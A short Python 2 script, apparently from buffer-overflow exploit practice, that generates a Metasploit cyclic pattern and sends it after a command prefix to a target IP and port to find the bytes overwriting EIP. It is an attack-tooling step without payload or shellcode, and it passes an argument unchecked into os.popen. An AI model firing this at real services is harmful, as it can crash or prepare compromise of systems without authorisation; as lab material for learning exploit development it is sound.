#!/usr/bin/python
import os, sys, socket, argparse

parser = argparse.ArgumentParser()
parser.add_argument("--h", help="this is the target IP Address")
parser.add_argument("--p", type=int, help="This is the target Port Number")
parser.add_argument("--cmd", type=str, help="This is the command to be eexcuted")
parser.add_argument("--l", type=str, help="This is the length of the pattern we use for bof, as determined in the previous step")
args = parser.parse_args()

RHOST = args.h
RPORT = args.p
cmd = args.cmd

#Taking the argument -l, we generate a pattern of length b using msf-pattern
pattern = os.popen('msf-pattern_create -l ' + args.l).read()
#We connect to the target machine and perform BOF using the pattern we created. we then look in immunity debugger 
#to find the bytes that have overwritten the EIP register
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((RHOST, RPORT))
s.send((cmd + pattern + '\n' ))
print s.recv(1024)
s.close()
	
